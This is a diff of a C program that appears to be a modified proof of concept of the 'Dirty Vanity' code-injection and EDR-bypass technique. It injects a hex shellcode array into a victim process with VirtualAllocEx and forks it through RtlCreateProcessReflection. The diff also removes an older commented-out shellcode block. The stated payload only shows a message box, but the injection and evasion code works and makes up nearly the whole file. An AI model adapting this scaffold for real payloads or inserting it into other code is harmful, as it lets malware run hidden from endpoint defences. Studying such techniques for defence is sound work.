@@ -1,7 +1,14 @@
 #include "vanity.h"
 #include <stdint.h>
-
-// creates a cmd /k msg * Hello from Dirty Vanity
+// Variant of Dirty Vanity technique founed by Eliran Nissan in "Dirty Vanity: A New Approach to Code injection & EDR bypass"
+/*
+ * Original Author: Eliran Nissan
+ * Modified by: Tam Meng
+ * Date: May 4, 2023
+ */
+/* I am learning from the experts */
+// Compiled with x86_64-w64-mingw32-gcc vanity.c -o vanity.exe
+// creates a cmd /k msg * Hello from Tam.Meng
 // and suspends the injection
 unsigned char spellcode[] =
        {
@@ -345,23 +352,6 @@ unsigned char spellcode[] =
          0xa5,0x58,0x03,0x00,0x00,0x5f,0x5d,0xc3
        };
 
-//        "\xd9\xc1\xbf\xb2\x21\x47\xcc\xd9\x74\x24\xf4\x58\x33\xc9"
-//        "\xb1\x31\x31\x78\x1a\x03\x78\x1a\x83\xc0\x04\xe2\x47\xdd"
-//        "\xaf\x4e\xa7\x1e\x30\x2f\x2e\xfb\x01\x6f\x54\x8f\x32\x5f"
-//        "\x1f\xdd\xbe\x14\x4d\xf6\x35\x58\x59\xf9\xfe\xd7\xbf\x34"
-//        "\xfe\x44\x83\x57\x7c\x97\xd7\xb7\xbd\x58\x2a\xb9\xfa\x85"
-//        "\xc6\xeb\x53\xc1\x74\x1c\xd7\x9f\x44\x97\xab\x0e\xcc\x44"
-//        "\x7b\x30\xfd\xda\xf7\x6b\xdd\xdd\xd4\x07\x54\xc6\x39\x2d"
-//        "\x2f\x7d\x89\xd9\xae\x57\xc3\x22\x1c\x96\xeb\xd0\x5d\xde"
-//        "\xcc\x0a\x28\x16\x2f\xb6\x2a\xed\x4d\x6c\xbf\xf6\xf6\xe7"
-//        "\x67\xd3\x07\x2b\xf1\x90\x04\x80\x76\xfe\x08\x17\x5b\x74"
-//        "\x34\x9c\x5a\x5b\xbc\xe6\x78\x7f\xe4\xbd\xe1\x26\x40\x13"
-//        "\x1e\x38\x2b\xcc\xba\x32\xc6\x19\xb7\x18\x8d\xdc\x4a\x27"
-//        "\xe3\xdf\x54\x28\x54\x88\x65\xa3\x3b\xcf\x7a\x66\x78\x3f"
-//        "\x31\x2b\x29\xa8\x9f\xb9\x6b\xb5\x20\x14\xaf\xc0\xa2\x9d"
-//        "\x50\x37\xba\xd7\x55\x73\x7d\x0b\x24\xec\xeb\x2b\x9b\x0d"
-//        "\x3e\x48\x76\x96\xe0\xa0\xeb\x76\x84\xd7\x99\x76";
-
 DWORD CreateCalcAndGetPid() {
     STARTUPINFO si;
     PROCESS_INFORMATION pi;
@@ -411,7 +401,6 @@ int main(int argc, char** argv)
     // allocate spellcode within victim
     DWORD_PTR spellcodeSize = sizeof(spellcode);
 
-//    LPVOID baseAddress = VirtualAllocEx(victimHandle, nullptr, spellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     LPVOID baseAddress = VirtualAllocEx(victimHandle, NULL, spellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
     if (baseAddress == NULL)
@@ -448,17 +437,7 @@ int main(int argc, char** argv)
     }
 
     T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION info = { 0 };
-//    NTSTATUS reflectRet = RtlCreateProcessReflection(victimHandle, RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES | RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE, baseAddress, NULL, NULL, &info);
-//    if (reflectRet == STATUS_SUCCESS) {
-////        printf("[+] Successfully Mirrored to new PID: %d\n", (DWORD)info.ReflectionClientId.UniqueProcess);
-////        printf("[+] Successfully Mirrored to new PID: %lu\n", (unsigned long)info.ReflectionClientId.UniqueProcess);
-//        printf("[+] Successfully Mirrored to new PID: %llu\n", (uintptr_t)info.ReflectionClientId.UniqueProcess);
-//
-//
-//    }
-//    else {
-//        printf("[!] Error Mirroring: ERROR %d\n", GetLastError());
-//    }
+
     NTSTATUS reflectRet = RtlCreateProcessReflection(victimHandle, RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES | RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE, baseAddress, NULL, NULL, &info);
     if (reflectRet != STATUS_SUCCESS) {
         printf("[-] Error Mirroring: NTSTATUS 0x%08X, GetLastError: ERROR %d\n", reflectRet, GetLastError());
